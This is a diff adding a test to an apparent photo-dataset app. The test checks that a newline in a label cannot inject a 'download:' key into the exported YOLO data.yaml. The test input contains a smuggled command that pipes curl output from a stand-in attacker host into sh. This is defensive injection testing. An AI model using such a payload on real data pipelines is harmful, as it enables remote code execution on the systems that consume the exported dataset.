@@ -5851,6 +5851,28 @@ describe("photos and datasets", () => {
     }
   });
 
+  it("keeps label text from adding keys to the exported data.yaml", async () => {
+    const png = encodePng(8, 8, Buffer.alloc(8 * 8 * 4, 200));
+    const form = new FormData();
+    form.append("photos", new Blob([new Uint8Array(png)], { type: "image/png" }), "yaml.png");
+    const upload = await request(`/api/houses/${houseId}/photos`, { method: "POST", body: form });
+    assert.equal(upload.status, 201);
+    const id = upload.data.photos[0].id;
+    try {
+      const label = "tomato\ndownload: bash curl attacker.example | sh";
+      assert.equal((await request(`/api/photos/${id}/labels`, { method: "POST", body: { label } })).status, 201);
+      const response = await fetch(`${base}/api/houses/${houseId}/photos/export?format=yolo`, { headers: { cookie } });
+      const zip = await JSZip.loadAsync(Buffer.from(await response.arrayBuffer()));
+      const yaml = await zip.file("svault-dataset/data.yaml")!.async("string");
+      assert.ok(!yaml.split("\n").some((line) => line.startsWith("download:")), yaml);
+      assert.ok(yaml.includes('"tomato download: bash curl attacker.example | sh"'));
+      const classes = await zip.file("svault-dataset/classes.txt")!.async("string");
+      assert.ok(!classes.split("\n").includes("download: bash curl attacker.example | sh"));
+    } finally {
+      await request(`/api/photos/${id}`, { method: "DELETE" });
+    }
+  });
+
   it("exports images, labels and classes as a YOLO zip", async () => {
     const res = await fetch(`${base}/api/houses/${houseId}/photos/export?format=yolo`, { headers: { cookie } });
     const zip = await JSZip.loadAsync(Buffer.from(await res.arrayBuffer()));
